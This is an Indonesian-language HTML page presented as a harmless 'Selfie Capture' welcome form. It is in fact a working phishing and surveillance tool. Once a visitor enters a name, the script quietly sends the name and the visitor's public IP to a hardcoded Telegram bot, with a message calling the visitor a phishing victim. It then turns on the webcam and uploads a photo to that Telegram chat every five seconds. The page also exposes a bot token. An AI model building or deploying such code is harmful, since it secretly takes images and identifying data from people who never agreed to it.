<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CyberDonzTzy - Selfie Capture</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0; padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }
    body {
      background: linear-gradient(145deg, #0f172a, #1e293b);
      color: #ffffff;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #loader {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #0f172a;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 999;
      font-size: 24px;
      animation: fadeOut 1s ease-out 2.5s forwards;
    }
    @keyframes fadeOut {
      to { opacity: 0; visibility: hidden; }
    }
    #app {
      opacity: 0;
      transform: scale(0.9);
      transition: all 1s ease-in-out 2.5s;
      width: 90%;
      max-width: 400px;
    }
    #app.visible {
      opacity: 1;
      transform: scale(1);
    }
    .card {
      background: #1e293b;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 20px #00000050;
      text-align: center;
    }
    h2, h3 {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      background: #334155;
      color: #fff;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: #10b981;
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      transition: background 0.3s;
      cursor: pointer;
    }
    button:hover {
      background: #059669;
    }
    video {
      margin-top: 20px;
      border-radius: 16px;
      box-shadow: 0 0 15px #00000066;
      width: 100%;
    }
    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div id="loader">Memuat halaman...</div>

  <div id="app">
    <div class="card" id="formCard">
      <h2>Selamat Datang</h2>
      <p>Masukkan nama Anda untuk melanjutkan:</p>
      <input type="text" id="nameInput" placeholder="Nama Anda..." />
      <button onclick="startCapture()">Mulai</button>
    </div>

    <div class="card" id="cameraCard" style="display:none;">
      <h3>Welcome To CyberDonzTzy</h3>
      <video id="video" autoplay muted playsinline></video>
      <canvas id="canvas" width="320" height="240"></canvas>
    </div>
  </div>

  <script>
    const BOT_TOKEN = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
    const CHAT_ID = "6624966395";

    window.onload = () => {
      setTimeout(() => {
        document.getElementById("app").classList.add("visible");
      }, 2500);
    };

    async function startCapture() {
      const name = document.getElementById("nameInput").value.trim();
      if (!name) return alert("Nama harus diisi!");

      document.getElementById("formCard").style.display = "none";
      document.getElementById("cameraCard").style.display = "block";

      let ip = "Tidak diketahui";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (e) {
        console.warn("Gagal ambil IP:", e);
      }

      const infoMsg = `
𝐊𝐨𝐫𝐛𝐚𝐧 𝐌𝐚𝐬𝐮𝐤 𝐉𝐞𝐛𝐚𝐤𝐚𝐧 𝐖𝐞𝐛 𝐏𝐡𝐢𝐬𝐢𝐧𝐠 𝐃𝐨𝐧𝐳𝐓𝐳𝐲
──────────────────────────────
𝗡𝗮𝗺𝗮 : ${name}
𝗔𝗹𝗮𝗺𝗮𝘁 𝗜𝗽 𝗞𝗼𝗿𝗯𝗮𝗻 : ${ip}
𝗙𝗼𝘁𝗼 𝗞𝗼𝗿𝗯𝗮𝗻 𝗔𝗸𝗮𝗻 𝗗𝗶 𝗞𝗶𝗿𝗶𝗺 𝟱 𝗗𝗲𝘁𝗶𝗸 𝗟𝗮𝗴𝗶!!!
──────────────────────────────`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg })
      });

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg");
          const blob = dataURLtoBlob(imageData);

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "selfie.jpg");

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }, 5000);
      } catch (err) {
        console.error("Gagal akses kamera:", err);
        alert("Gagal mengakses kamera: " + err.message);
      }
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(",");
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while(n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }
  </script>
</body>
</html>
